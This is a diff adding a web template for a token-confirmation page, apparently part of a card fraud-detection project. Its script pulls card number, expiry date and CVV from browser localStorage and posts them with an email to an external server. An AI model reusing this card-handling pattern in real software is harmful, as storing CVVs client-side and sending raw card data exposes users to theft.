@@ -1,0 +1,70 @@
+{% extends "base.html" %}
+{% block content %}
+<head>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<div class="form-container">
+    <h2>Confirm Token</h2>
+    <form id="confirm-token-form">
+        <input type="text" id="token" name="token" placeholder="Enter your token" required>
+        <button type="submit" id="verify-button">Verify</button>
+    </form>
+</div>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    const form = document.getElementById('confirm-token-form');
+    form.addEventListener('submit', function(event) {
+        event.preventDefault();
+        const verifyButton = document.getElementById('verify-button');
+        verifyButton.disabled = true;
+        verifyButton.innerText = 'Verifying...';
+
+        const token = document.getElementById('token').value;
+        const cardDetails = JSON.parse(localStorage.getItem('cardDetails'));
+        const email = localStorage.getItem('email');
+        if (!cardDetails) {
+            alert('Card details not found. Please try again.');
+            verifyButton.disabled = false;
+            verifyButton.innerText = 'Verify';
+            return;
+        }
+
+        const { cardNumber, expiryDate, cvv } = cardDetails;
+
+        const formData = new URLSearchParams();
+        formData.append('token', token);
+        formData.append('cardNumber', cardNumber);
+        formData.append('expiryDate', expiryDate);
+        formData.append('cvv', cvv);
+        formData.append('email', email)
+
+        fetch('https://cc-frauddetection-server.onrender.com/api/users/validate-card', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: formData
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Failed to validate card');
+                console.log(response.message.Error);
+            }
+            return response.json();
+        })
+        .then(data => {
+            // "home.html" is your success page
+            window.location.href = '/home';
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            alert('Verification failed. Please try again.');
+        })
+        .finally(() => {
+            verifyButton.disabled = false;
+            verifyButton.innerText = 'Verify';
+        });
+    });
+});
+</script>
+{% endblock %}
